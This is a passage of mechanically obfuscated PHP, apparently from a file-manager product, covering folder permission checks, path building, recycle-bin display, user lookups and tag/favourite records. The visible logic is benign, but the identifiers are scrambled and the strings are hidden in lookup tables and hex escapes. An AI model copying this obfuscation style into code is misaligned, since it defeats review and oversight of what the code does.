$¶Ÿê»ªâ = array($®â˛Ïâ§[212] => 0, $®â˛Ïâ§[213] => 0); foreach ($æÔ¨‡√è as &$Ë˚§üúÌ) { if (!$Ë˚§üúÌ[$®â˛Ïâ§[411]]) { continue; } $·∞ª∆§π[] = $Ë˚§üúÌ[$®â˛Ïâ§[403]]; } unset($Ë˚§üúÌ); if (!$·∞ª∆§π) { return; } $íàøıÃ… = array($®â˛Ïâ§[498] => array($®â˛Ïâ§[7], $·∞ª∆§π)); $ûºﬂëß∏ = array($®â˛Ïâ§[498], $®â˛Ïâ§[411], $®â˛Ïâ§[499] => $®â˛Ïâ§[500]); $Ú™ÎïÊπ = $this->field($ûºﬂëß∏)->where($íàøıÃ…)->group($®â˛Ïâ§[501])->select(); $¶…ùØ´É = array(); foreach ($Ú™ÎïÊπ as $¶ﬂÄÆ˙Ê) { $í˘©‹‘Ä = $¶ﬂÄÆ˙Ê[$®â˛Ïâ§[498]]; $óÄà∫Ãê = $¶ﬂÄÆ˙Ê[$®â˛Ïâ§[411]] == $®â˛Ïâ§[99] ? $®â˛Ïâ§[213] : $®â˛Ïâ§[212]; if (!isset($¶…ùØ´É[$í˘©‹‘Ä])) { $¶…ùØ´É[$í˘©‹‘Ä] = array($®â˛Ïâ§[212] => 0, $®â˛Ïâ§[213] => 0); } $¶…ùØ´É[$í˘©‹‘Ä][$óÄà∫Ãê] += $¶ﬂÄÆ˙Ê[$®â˛Ïâ§[500]]; } foreach ($æÔ¨‡√è as &$Ë˚§üúÌ) { if (!$Ë˚§üúÌ[$®â˛Ïâ§[411]]) { continue; } $Ì∆´•¿œ = is_array($¶…ùØ´É[$Ë˚§üúÌ[$®â˛Ïâ§[403]]]) ? $¶…ùØ´É[$Ë˚§üúÌ[$®â˛Ïâ§[403]]] : $¶Ÿê»ªâ; $Ë˚§üúÌ[$®â˛Ïâ§[213]] = $Ì∆´•¿œ[$®â˛Ïâ§[213]]; $Ë˚§üúÌ[$®â˛Ïâ§[212]] = $Ì∆´•¿œ[$®â˛Ïâ§[212]]; unset($Ë˚§üúÌ[$®â˛Ïâ§[413]]); } unset($Ë˚§üúÌ); } protected function _listAppendAuth(&$É˘±¨ôö) { $«°°’¿ø =& $_SERVER[ëæªã÷]; if (!defined($«°°’¿ø[474])) { return; } $ÂÕ≤áá¿ = array(); foreach ($É˘±¨ôö as $øµ˙£Æ°) { if ($øµ˙£Æ°[$«°°’¿ø[412]] == self::TYPE_GROUP) { $ÂÕ≤áá¿[] = $øµ˙£Æ°[$«°°’¿ø[403]]; } } if (!$ÂÕ≤áá¿) { return; } $õÏÑó∆≥ = array_to_keyvalue($É˘±¨ôö, $«°°’¿ø[403]); $–Äöºüà = Model($«°°’¿ø[502])->getSourceList($ÂÕ≤áá¿, $õÏÑó∆≥); foreach ($É˘±¨ôö as $ï„º®ÿì => &$øµ˙£Æ°) { $øµ˙£Æ°[$«°°’¿ø[414]] = $–Äöºüà[$øµ˙£Æ°[$«°°’¿ø[403]]]; if (!$øµ˙£Æ°[$«°°’¿ø[414]] && $øµ˙£Æ°[$«°°’¿ø[412]] == self::TYPE_GROUP) { $øµ˙£Æ°[$«°°’¿ø[414]] = Action($«°°’¿ø[503])->pathGroupAuthMake($øµ˙£Æ°[$«°°’¿ø[504]]); if (!$øµ˙£Æ°[$«°°’¿ø[414]] && !_get($GLOBALS, $«°°’¿ø[505])) { $øµ˙£Æ°[$«°°’¿ø[205]] = !1; $øµ˙£Æ°[$«°°’¿ø[204]] = !1; } } if ($øµ˙£Æ°[$«°°’¿ø[414]]) { $øµ˙£Æ°[$«°°’¿ø[205]] = AuthModel::authCheckEdit($øµ˙£Æ°[$«°°’¿ø[414]][$«°°’¿ø[415]]); $øµ˙£Æ°[$«°°’¿ø[204]] = AuthModel::authCheckView($øµ˙£Æ°[$«°°’¿ø[414]][$«°°’¿ø[415]]); } $this->groupPathDisplay($øµ˙£Æ°); } unset($øµ˙£Æ°); } public function _listAppendAuthSecret(&$»‰Ô∑˚“) { $ºò¬–åõ =& $_SERVER[ëæªã÷]; if (Model($ºò¬–åõ[433])->get($ºò¬–åõ[506]) != $ºò¬–åõ[99]) { return; } static $”å“◊ˆ€ = false; if (!$”å“◊ˆ€) { $Ïë’´·Ç = Model($ºò¬–åõ[507]); $ßÄ‚∂ƒ≠ = Model($ºò¬–åõ[508]); $”å“◊ˆ€ = $ßÄ‚∂ƒ≠->listData(); $”å“◊ˆ€ = array_to_keyvalue($”å“◊ˆ€, $ºò¬–åõ[403]); $õ≈µ“ìŒ = json_decode(Model($ºò¬–åõ[433])->get($ºò¬–åõ[509]), !0); $õ≈µ“ìŒ = array_to_keyvalue($õ≈µ“ìŒ, $ºò¬–åõ[401]); foreach ($”å“◊ˆ€ as $‹ÿÎ£¶˛ => $ÂºæÌ¯ü) { $≤´˘âÇæ = $õ≈µ“ìŒ[$ÂºæÌ¯ü[$ºò¬–åõ[510]]]; if (!$≤´˘âÇæ) { $ßÄ‚∂ƒ≠->remove($ÂºæÌ¯ü[$ºò¬–åõ[401]]); unset($”å“◊ˆ€[$‹ÿÎ£¶˛]); continue; } $ÃîÀ∑π‰ = $Ïë’´·Ç->listData($≤´˘âÇæ[$ºò¬–åõ[414]]); if (!$ÃîÀ∑π‰) { $ßÄ‚∂ƒ≠->remove($ÂºæÌ¯ü[$ºò¬–åõ[401]]); unset($”å“◊ˆ€[$‹ÿÎ£¶˛]); continue; } $ÂºæÌ¯ü[$ºò¬–åõ[414]] = $ÃîÀ∑π‰; $ÂºæÌ¯ü[$ºò¬–åõ[511]] = $≤´˘âÇæ; $ÂºæÌ¯ü[$ºò¬–åõ[512]] = Model($ºò¬–åõ[513])->getInfoSimpleOuter($ÂºæÌ¯ü[$ºò¬–åõ[452]]); $”å“◊ˆ€[$‹ÿÎ£¶˛] = $ÂºæÌ¯ü; } } $’ŒèÎÔ• = defined($ºò¬–åõ[514]) ? USER_ID : $ºò¬–åõ[12]; $©˛≥®π± = array(); $±æ˝∞‰ª = $this->_listAppendPath($©˛≥®π±, !0); foreach ($»‰Ô∑˚“ as $‹ÿÎ£¶˛ => &$ÂºæÌ¯ü) { if (!is_array($ÂºæÌ¯ü[$ºò¬–åõ[414]])) { continue; } if ($ÂºæÌ¯ü[$ºò¬–åõ[412]] != $ºò¬–åõ[515]) { continue; } if (isset($”å“◊ˆ€[$ÂºæÌ¯ü[$ºò¬–åõ[403]]])) { $©ƒÀﬂÒŸ = $”å“◊ˆ€[$ÂºæÌ¯ü[$ºò¬–åõ[403]]]; if (!is_array($ÂºæÌ¯ü[$ºò¬–åõ[465]])) { $ÂºæÌ¯ü[$ºò¬–åõ[465]] = array(); } $ÂºæÌ¯ü[$ºò¬–åõ[465]][$ºò¬–åõ[516]] = $©ƒÀﬂÒŸ[$ºò¬–åõ[510]]; $ÂºæÌ¯ü[$ºò¬–åõ[414]][$ºò¬–åõ[517]] = $©ƒÀﬂÒŸ; $ÂºæÌ¯ü[$ºò¬–åõ[414]][$ºò¬–åõ[518]] = $ÂºæÌ¯ü[$ºò¬–åõ[519]]; $ÂºæÌ¯ü[$ºò¬–åõ[414]][$ºò¬–åõ[520]] = $ºò¬–åõ[99]; if ($©ƒÀﬂÒŸ[$ºò¬–åõ[452]] != $’ŒèÎÔ•) { $ÂºæÌ¯ü[$ºò¬–åõ[414]][$ºò¬–åõ[415]] = $ÂºæÌ¯ü[$ºò¬–åõ[414]][$ºò¬–åõ[415]] & $©ƒÀﬂÒŸ[$ºò¬–åõ[414]][$ºò¬–åõ[414]]; } continue; } $õõ‘ØõÛ = $this->parentLevelArray($ÂºæÌ¯ü[$ºò¬–åõ[521]]); $˜ô∞âåË = array_reverse($õõ‘ØõÛ); foreach ($˜ô∞âåË as $Ùé∑Ÿé‰ => $Ò€Ùúòõ) { if (!isset($”å“◊ˆ€[$Ò€Ùúòõ])) { continue; } $©ƒÀﬂÒŸ = $”å“◊ˆ€[$Ò€Ùúòõ]; $ÂºæÌ¯ü[$ºò¬–åõ[414]][$ºò¬–åõ[517]] = $©ƒÀﬂÒŸ; if ($©ƒÀﬂÒŸ[$ºò¬–åõ[452]] != $’ŒèÎÔ•) { $ÂºæÌ¯ü[$ºò¬–åõ[414]][$ºò¬–åõ[415]] = $ÂºæÌ¯ü[$ºò¬–åõ[414]][$ºò¬–åõ[415]] & $©ƒÀﬂÒŸ[$ºò¬–åõ[414]][$ºò¬–åõ[414]]; } $Úç¨∂¡‰ = $ºò¬–åõ[12]; $‡¸®∑ì∞ = count($õõ‘ØõÛ) - $Ùé∑Ÿé‰; for ($¬Ñïªä´ = 0; $¬Ñïªä´ < $‡¸®∑ì∞; $¬Ñïªä´++) { if (!isset($±æ˝∞‰ª[$õõ‘ØõÛ[$¬Ñïªä´]])) { $Úç¨∂¡‰ = $ºò¬–åõ[12]; break; } $Úç¨∂¡‰ = $Úç¨∂¡‰ . rtrim($±æ˝∞‰ª[$õõ‘ØõÛ[$¬Ñïªä´]], $ºò¬–åõ[8]) . $ºò¬–åõ[8]; } $ÂºæÌ¯ü[$ºò¬–åõ[414]][$ºò¬–åõ[518]] = rtrim($Úç¨∂¡‰, $ºò¬–åõ[8]) . $ºò¬–åõ[8]; break; } } unset($ÂºæÌ¯ü); } public function groupPathDisplay(&$•ú√é™) { $Ú¿Äüäπ =& $_SERVER[ëæªã÷]; if ($•ú√é™[$Ú¿Äüäπ[412]] != self::TYPE_GROUP) { return; } $è‡»∞ê· = Model($Ú¿Äüäπ[522])->getInfo($•ú√é™[$Ú¿Äüäπ[504]]); $´ËÎÇ≤˙ = $this->parentLevelArray($è‡»∞ê·[$Ú¿Äüäπ[521]]); $ıª≈•£Ü = $Ú¿Äüäπ[12]; foreach ($´ËÎÇ≤˙ as $Ã£Û„¥È) { $ç…À“Ï€ = Model($Ú¿Äüäπ[522])->getInfo($Ã£Û„¥È); $ıª≈•£Ü .= $ç…À“Ï€[$Ú¿Äüäπ[97]][$Ú¿Äüäπ[403]] . $Ú¿Äüäπ[50]; } $•ú√é™[$Ú¿Äüäπ[523]] = $è‡»∞ê·[$Ú¿Äüäπ[498]]; $•ú√é™[$Ú¿Äüäπ[524]] = $è‡»∞ê·[$Ú¿Äüäπ[521]]; $•ú√é™[$Ú¿Äüäπ[525]] = $è‡»∞ê·[$Ú¿Äüäπ[526]]; $•ú√é™[$Ú¿Äüäπ[527]] = $ıª≈•£Ü . $è‡»∞ê·[$Ú¿Äüäπ[97]][$Ú¿Äüäπ[403]]; } protected function _listAppendPath(&$Áâã…“ö, $•éÎ‹ëã = false) { $∏˘£“ö£ =& $_SERVER[ëæªã÷]; static $ºÑáË∏Ø = array(); $∂¢ΩÕßà = array(); $Ì˙ÃÃßî = array(); if ($•éÎ‹ëã) { return $ºÑáË∏Ø; } foreach ($Áâã…“ö as &$≤ √«©) { $·¯éÏ©Ï = $≤ √«©[$∏˘£“ö£[403]]; if ($≤ √«©[$∏˘£“ö£[411]] == $∏˘£“ö£[99] && $≤ √«©[$∏˘£“ö£[498]] != 0) { $ºÑáË∏Ø[$·¯éÏ©Ï] = $≤ √«©[$∏˘£“ö£[32]]; } if ($≤ √«©[$∏˘£“ö£[411]] == $∏˘£“ö£[99] && $≤ √«©[$∏˘£“ö£[498]] == 0 && !isset($ºÑáË∏Ø[$·¯éÏ©Ï])) { $ºÑáË∏Ø[$·¯éÏ©Ï] = $this->_listAppendPathRoot($≤ √«©, array()); } if (isset($Ì˙ÃÃßî[$≤ √«©[$∏˘£“ö£[521]]])) { continue; } $Ì˙ÃÃßî[$≤ √«©[$∏˘£“ö£[521]]] = !0; $òôô‰∞∞ = $this->parentLevelArray($≤ √«©[$∏˘£“ö£[521]]); foreach ($òôô‰∞∞ as $´Ëê™Û™ => $£ç‰á»Ó) { if (isset($ºÑáË∏Ø[$£ç‰á»Ó])) { continue; } if ($´Ëê™Û™ == 0) { $ºÑáË∏Ø[$£ç‰á»Ó] = $this->_listAppendPathRoot($≤ √«©, $òôô‰∞∞); } if ($´Ëê™Û™ != 0) { $∂¢ΩÕßà[] = $£ç‰á»Ó; } } } unset($≤ √«©); $∂¢ΩÕßà = array_unique($∂¢ΩÕßà); if (count($∂¢ΩÕßà) > 0) { $∂Ä§Â‚Ï = array($∏˘£“ö£[418] => array($∏˘£“ö£[419], $∂¢ΩÕßà)); if (count($∂¢ΩÕßà) == 1) { $ôö˝Îπ¯ = $this->sourceInfo($∂¢ΩÕßà[0]); $ò∞™™≠é = is_array($ôö˝Îπ¯) ? array($ôö˝Îπ¯) : !1; } else { $ò∞™™≠é = $this->field($∏˘£“ö£[528])->where($∂Ä§Â‚Ï)->select(); } if (!$ò∞™™≠é) { $ò∞™™≠é = array(); } foreach ($ò∞™™≠é as $˛∏ΩÏ¬¥) { $ºÑáË∏Ø[$˛∏ΩÏ¬¥[$∏˘£“ö£[403]]] = $˛∏ΩÏ¬¥[$∏˘£“ö£[32]]; } } $‰ÒΩ„§ß = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ËƒæÌøË = array(); foreach ($Áâã…“ö as &$≤ √«©) { $ÇëﬁÈèÈ = $≤ √«©[$∏˘£“ö£[521]]; $ˆæ‚Â°Ó = $∏˘£“ö£[12]; if (isset($ËƒæÌøË[$ÇëﬁÈèÈ])) { $ˆæ‚Â°Ó = $ËƒæÌøË[$ÇëﬁÈèÈ]; } else { $òôô‰∞∞ = $this->parentLevelArray($≤ √«©[$∏˘£“ö£[521]]); foreach ($òôô‰∞∞ as $´Ëê™Û™ => $£ç‰á»Ó) { if (isset($ºÑáË∏Ø[$£ç‰á»Ó])) { $ˆæ‚Â°Ó .= $ºÑáË∏Ø[$£ç‰á»Ó] . $∏˘£“ö£[8]; } } $ËƒæÌøË[$ÇëﬁÈèÈ] = $ˆæ‚Â°Ó; } $ˆæ‚Â°Ó .= $≤ √«©[$∏˘£“ö£[32]]; if ($≤ √«©[$∏˘£“ö£[411]] == $∏˘£“ö£[99]) { $ˆæ‚Â°Ó .= $∏˘£“ö£[8]; } $≤ √«©[$∏˘£“ö£[519]] = str_replace($∏˘£“ö£[529], $∏˘£“ö£[8], $ˆæ‚Â°Ó); if ($≤ √«©[$∏˘£“ö£[498]] == $∏˘£“ö£[200]) { $≤ √«©[$∏˘£“ö£[32]] = trim($ºÑáË∏Ø[$≤ √«©[$∏˘£“ö£[403]]], $∏˘£“ö£[8]); $≤ √«©[$∏˘£“ö£[519]] = $≤ √«©[$∏˘£“ö£[32]] . $∏˘£“ö£[8]; } if (intval($≤ √«©[$∏˘£“ö£[412]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($≤ √«©, $òôô‰∞∞, $‰ÒΩ„§ß); } } unset($≤ √«©); return $Áâã…“ö; } private function _listAppendPathRecycle(&$äÔ†úà«, $„£Û„Ó”, $õ´Æóô˙) { $Ÿ»Ìˆ“’ =& $_SERVER[ëæªã÷]; if (!in_array($õ´Æóô˙, $„£Û„Ó”) && $äÔ†úà«[$Ÿ»Ìˆ“’[403]] != $õ´Æóô˙) { return; } $ËÆ™õ¬Ê = explode($Ÿ»Ìˆ“’[8], trim($äÔ†úà«[$Ÿ»Ìˆ“’[519]], $Ÿ»Ìˆ“’[8])); $Ê˜ÀÀ¬“ = implode($Ÿ»Ìˆ“’[8], array_slice($ËÆ™õ¬Ê, 2)); $äÔ†úà«[$Ÿ»Ìˆ“’[519]] = $Ÿ»Ìˆ“’[8] . LNG($Ÿ»Ìˆ“’[530]) . $Ÿ»Ìˆ“’[8] . ltrim($Ê˜ÀÀ¬“, $Ÿ»Ìˆ“’[8]); $äÔ†úà«[$Ÿ»Ìˆ“’[521]] = $Ÿ»Ìˆ“’[531] . implode($Ÿ»Ìˆ“’[50], array_slice($„£Û„Ó”, 1)) . $Ÿ»Ìˆ“’[50]; if ($äÔ†úà«[$Ÿ»Ìˆ“’[403]] == $õ´Æóô˙) { $äÔ†úà«[$Ÿ»Ìˆ“’[521]] = $Ÿ»Ìˆ“’[531]; $äÔ†úà«[$Ÿ»Ìˆ“’[498]] = $Ÿ»Ìˆ“’[200]; $äÔ†úà«[$Ÿ»Ìˆ“’[32]] = LNG($Ÿ»Ìˆ“’[530]); } $äÔ†úà«[$Ÿ»Ìˆ“’[532]] = $Ÿ»Ìˆ“’[533]; } protected function _listAppendPathRoot(&$ŒÀ≠‚∆÷, $‹ƒß∑À˜) { $Â•º◊¬« =& $_SERVER[ëæªã÷]; $‰ä®¶ Ï = $Â•º◊¬«[12]; if ($ŒÀ≠‚∆÷[$Â•º◊¬«[412]] == self::TYPE_USER) { if (defined($Â•º◊¬«[474]) && $ŒÀ≠‚∆÷[$Â•º◊¬«[504]] == USER_ID) { $‰ä®¶ Ï = LNG($Â•º◊¬«[534]); if (!$‹ƒß∑À˜) { $ŒÀ≠‚∆÷[$Â•º◊¬«[32]] = $‰ä®¶ Ï; } } else { $„∑’ì˙ç = Model($Â•º◊¬«[513])->getInfoSimple($ŒÀ≠‚∆÷[$Â•º◊¬«[504]]); $‰ä®¶ Ï = LNG($Â•º◊¬«[535]) . $Â•º◊¬«[169] . $„∑’ì˙ç[$Â•º◊¬«[32]] . $Â•º◊¬«[536]; } } else { if ($ŒÀ≠‚∆÷[$Â•º◊¬«[412]] == self::TYPE_GROUP) { $„∑’ì˙ç = Model($Â•º◊¬«[522])->getInfoSimple($ŒÀ≠‚∆÷[$Â•º◊¬«[504]]); $‰ä®¶ Ï = $„∑’ì˙ç[$Â•º◊¬«[32]]; } else { if ($ŒÀ≠‚∆÷[$Â•º◊¬«[412]] == self::TYPE_SYSTEM) { $‰ä®¶ Ï = $Â•º◊¬«[537]; } } } $‰ä®¶ Ï = $‰ä®¶ Ï ? $Â•º◊¬«[8] . $‰ä®¶ Ï . $Â•º◊¬«[8] : $Â•º◊¬«[8]; return $‰ä®¶ Ï; } protected function _listAppendUser(&$ËóÊ˛ﬂ¿) { $»¥≤ççÏ =& $_SERVER[ëæªã÷]; $¸≤Ö¯¶Ú = array_to_keyvalue($ËóÊ˛ﬂ¿, $»¥≤ççÏ[12], $»¥≤ççÏ[452]); $ã»ÏÆŸã = array_to_keyvalue($ËóÊ˛ﬂ¿, $»¥≤ççÏ[12], $»¥≤ççÏ[454]); $Ç›ñì’Â = array_merge($¸≤Ö¯¶Ú, $ã»ÏÆŸã); $Ω˘’·Ïí = Model($»¥≤ççÏ[538])->userListInfo($Ç›ñì’Â); foreach ($ËóÊ˛ﬂ¿ as &$∫Ç√öø£) { $Ùˆ≈ÑÎù = $∫Ç√öø£[$»¥≤ççÏ[452]]; $∫Ç√öø£[$»¥≤ççÏ[452]] = $Ω˘’·Ïí[$Ùˆ≈ÑÎù] ? $Ω˘’·Ïí[$Ùˆ≈ÑÎù] : !1; $Ùˆ≈ÑÎù = $∫Ç√öø£[$»¥≤ççÏ[454]]; $∫Ç√öø£[$»¥≤ççÏ[454]] = $Ω˘’·Ïí[$Ùˆ≈ÑÎù] ? $Ω˘’·Ïí[$Ùˆ≈ÑÎù] : !1; if (isset($∫Ç√öø£[$»¥≤ççÏ[465]]) && $∫Ç√öø£[$»¥≤ççÏ[465]][$»¥≤ççÏ[539]]) { $ëœ≈≥üı = $GLOBALS[$»¥≤ççÏ[6]][$»¥≤ççÏ[100]][$»¥≤ççÏ[540]]; if ($∫Ç√öø£[$»¥≤ççÏ[465]][$»¥≤ççÏ[541]] <= time() - $ëœ≈≥üı) { $this->metaSet($∫Ç√öø£[$»¥≤ççÏ[403]], $»¥≤ççÏ[539], null); $this->metaSet($∫Ç√öø£[$»¥≤ççÏ[403]], $»¥≤ççÏ[541], null); unset($∫Ç√öø£[$»¥≤ççÏ[465]][$»¥≤ççÏ[539]]); continue; } $„âŒ÷Èø = $∫Ç√öø£[$»¥≤ççÏ[465]][$»¥≤ççÏ[539]]; $∫Ç√öø£[$»¥≤ççÏ[465]][$»¥≤ççÏ[542]] = Model($»¥≤ççÏ[538])->getInfoSimpleOuter($„âŒ÷Èø); } } unset($∫Ç√öø£); } public function parentLevelArray($É¸∆Ä≤∂) { $Ëôº»ó¶ =& $_SERVER[ëæªã÷]; $É¸∆Ä≤∂ = explode($Ëôº»ó¶[50], trim($É¸∆Ä≤∂, $Ëôº»ó¶[50])); return array_remove_value($É¸∆Ä≤∂, $Ëôº»ó¶[200]); } public function listAll($ˆä˘•ÜÈ) { $´ÿÅ◊Û∂ =& $_SERVER[ëæªã÷]; $òÂ˜˙‰¸ = $this->sourceInfo($ˆä˘•ÜÈ); $∞ÿâ≠Ü≈ = array($´ÿÅ◊Û∂[543] => array($´ÿÅ◊Û∂[544], $òÂ˜˙‰¸[$´ÿÅ◊Û∂[521]] . $ˆä˘•ÜÈ . $´ÿÅ◊Û∂[545]), $´ÿÅ◊Û∂[546] => 0); $›û˝ó˘Ä = $´ÿÅ◊Û∂[547]; $’ÃˆüÒ = "\x4c\x45\106\x54\x20\x4a\117\111\x4e\x20{$this->tablePrefix}\151\157\x5f\146\x69\154\145\x20\x66\151\x6c\x65\40\x6f\x6e\40\x73\157\x75\x72\x63\x65\56\146\x69\154\x65\x49\104\40\75\40\x66\151\x6c\x65\56\x66\x69\x6c\145\x49\104"; $ÛÆ‘üì§ = $this->alias($´ÿÅ◊Û∂[444])->field($›û˝ó˘Ä)->where($∞ÿâ≠Ü≈)->join($’ÃˆüÒ)->select(); $this->_listAppendAuth($ÛÆ‘üì§); $this->_listAppendUser($ÛÆ‘üì§); $this->_listAppendPath($ÛÆ‘üì§); $ÛÆ‘üì§ = array_to_keyvalue($ÛÆ‘üì§, $´ÿÅ◊Û∂[403]); $≥Û±««Ü = "\x2f{$òÂ˜˙‰¸[$´ÿÅ◊Û∂[32]]}\57"; $≥Û±««Ü = $≥Û±««Ü == $´ÿÅ◊Û∂[529] ? $´ÿÅ◊Û∂[8] : $≥Û±««Ü; $œñ¬ø·û = array(); foreach ($ÛÆ‘üì§ as $ìëö¸≥¶ => $Í›¥•∞œ) { $öﬁí∂˙Ÿ = $this->parentLevelArray($Í›¥•∞œ[$´ÿÅ◊Û∂[521]]); array_shift($öﬁí∂˙Ÿ); $¨ŸœÆπ∆ = $≥Û±««Ü; for ($˝í±Ú∏ƒ = 0; $˝í±Ú∏ƒ < count($öﬁí∂˙Ÿ); $˝í±Ú∏ƒ++) { $¨ŸœÆπ∆ .= $ÛÆ‘üì§[$öﬁí∂˙Ÿ[$˝í±Ú∏ƒ]][$´ÿÅ◊Û∂[32]] . $´ÿÅ◊Û∂[8]; } $¨ŸœÆπ∆ .= $Í›¥•∞œ[$´ÿÅ◊Û∂[32]]; if ($Í›¥•∞œ[$´ÿÅ◊Û∂[411]]) { $¨ŸœÆπ∆ .= $´ÿÅ◊Û∂[8]; } $¨ŸœÆπ∆ = str_replace($´ÿÅ◊Û∂[529], $´ÿÅ◊Û∂[8], $¨ŸœÆπ∆); $¨ŸœÆπ∆ = str_replace($´ÿÅ◊Û∂[529], $´ÿÅ◊Û∂[8], $¨ŸœÆπ∆); $‡éƒƒÉ¸ = array($´ÿÅ◊Û∂[422] => str_replace($´ÿÅ◊Û∂[529], $´ÿÅ◊Û∂[8], $¨ŸœÆπ∆), $´ÿÅ◊Û∂[548] => intval($Í›¥•∞œ[$´ÿÅ◊Û∂[411]]), $´ÿÅ◊Û∂[97] => $this->pathInfoFilter($Í›¥•∞œ)); if (!$Í›¥•∞œ[$´ÿÅ◊Û∂[411]]) { $‡éƒƒÉ¸[$´ÿÅ◊Û∂[467]] = $Í›¥•∞œ[$´ÿÅ◊Û∂[467]]; $‡éƒƒÉ¸[$´ÿÅ◊Û∂[98]] = $Í›¥•∞œ[$´ÿÅ◊Û∂[88]]; } $œñ¬ø·û[] = $‡éƒƒÉ¸; } return $œñ¬ø·û; } } goto FÙÜ·†Ãâπ; c»áæÇßí≠: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\x5f\146\141\166"; protected function cacheFunctionAlias($ØË¿–˚Â) { $öôΩ–˝È =& $_SERVER[ëæªã÷]; return array($öôΩ–˝È[1904] => array(USER_ID, $öôΩ–˝È[1905])); } protected function listData() { $•‚ÏÎﬂ“ =& $_SERVER[ëæªã÷]; $ﬁ®˛ÁÙí = array($•‚ÏÎﬂ“[1619] => USER_ID, $•‚ÏÎﬂ“[483] => array($•‚ÏÎﬂ“[1908], 0)); $Ï«°≠â€ = $•‚ÏÎﬂ“[1910]; $Á∂–È‰ë = $this->field($Ï«°≠â€)->where($ﬁ®˛ÁÙí)->order($•‚ÏÎﬂ“[1911])->select(); return $Á∂–È‰ë ? $Á∂–È‰ë : array(); } protected function listByTag($†äáŒ»ä) { } protected function addToTag($·ö°¢ ∂, $Ëˆá◊ò©) { $Íª’ÿ•› =& $_SERVER[ëæªã÷]; if (!Model($Íª’ÿ•›[2045])->listData($Ëˆá◊ò©) || !Model($Íª’ÿ•›[805])->pathInfo($·ö°¢ ∂)) { return !1; } $ﬂ≥âï”¥ = array($Íª’ÿ•›[1619] => USER_ID, $Íª’ÿ•›[483] => $Ëˆá◊ò©, $Íª’ÿ•›[422] => $·ö°¢ ∂, $Íª’ÿ•›[423] => $Íª’ÿ•›[417], $Íª’ÿ•›[421] => $Íª’ÿ•›[12], $Íª’ÿ•›[1800] => 0); if ($this->where($ﬂ≥âï”¥)->find()) { return !1; } return $this->add($ﬂ≥âï”¥); } protected function removeFromTag($’±…‘≥€, $≈û¨¸ÛÛ) { $¢‡˜™–¬ =& $_SERVER[ëæªã÷]; if (!Model($¢‡˜™–¬[2045])->listData($≈û¨¸ÛÛ)) { return !1; } if (is_array($’±…‘≥€)) { $’±…‘≥€ = array($¢‡˜™–¬[7], $’±…‘≥€); } $Œ≥∑„ôï = array($¢‡˜™–¬[1619] => USER_ID, $¢‡˜™–¬[483] => $≈û¨¸ÛÛ, $¢‡˜™–¬[423] => $¢‡˜™–¬[417], $¢‡˜™–¬[422] => $’±…‘≥€); return $this->where($Œ≥∑„ôï)->delete(); } protected function removeByTag($•«‹≈Øá) { $¶åüî√¸ =& $_SERVER[ëæªã÷]; if (!$•«‹≈Øá) { return !1; } $·˙’›¿Ö = array($¶åüî√¸[1619] => USER_ID, $¶åüî√¸[483] => $•«‹≈Øá); return $this->where($·˙’›¿Ö)->delete(); } protected function removeBySource($ö‹∫≠ÅÌ) { $Í¶¬»ïò =& $_SERVER[ëæªã÷]; if (is_array($ö‹∫≠ÅÌ)) { $ö‹∫≠ÅÌ = array($Í¶¬»ïò[7], $ö‹∫≠ÅÌ); } $á†˘ÎÖﬂ = array($Í¶¬»ïò[1619] => USER_ID, $Í¶¬»ïò[422] => $ö‹∫≠ÅÌ, $Í¶¬»ïò[483] => array($Í¶¬»ïò[990], 0)); return $this->where($á†˘ÎÖﬂ)->delete(); } }